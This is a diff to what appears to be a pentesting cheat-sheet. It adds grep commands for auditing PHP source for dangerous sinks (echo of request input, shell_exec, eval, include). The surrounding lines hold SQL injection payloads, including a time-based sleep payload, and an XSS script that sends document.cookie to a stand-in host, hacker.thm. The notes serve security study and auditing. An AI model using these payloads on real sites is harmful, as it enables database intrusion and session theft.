@@ -50,6 +50,40 @@ OR 1=1 --
 XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z
 
 
+# 源码审计
+SonarQube 这样的工具
+XSS:
+grep -Ri "\$_" . | grep "echo"
+grep -Ri "\$_GET" . | grep "echo"
+grep -Ri "\$_POST" . | grep "echo"
+grep -Ri "\$_REQUEST" . | grep "echo"
+
+Command execution:
+grep -Ri "shell_exec(" .
+grep -Ri "system(" .
+grep -Ri "exec(" .
+
+Code execution:
+grep -Ri "eval(" .
+grep -Ri "assert(" .
+grep -Ri "preg_replace" . | grep "/e"
+
+SQL Injection:
+grep -Ri "\$sql" .
+grep -Ri "\$sql" . | grep "\$_"
+
+RFI/LFI:
+grep -Ri "file_include" .
+grep -Ri "include(" .
+grep -Ri "require(" .
+grep -Ri "include_once(" .
+grep -Ri "require_once(" .
+grep -Ri "require_once(" . | grep "\$_"
+
+
+
+
+
 # XSS
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
 
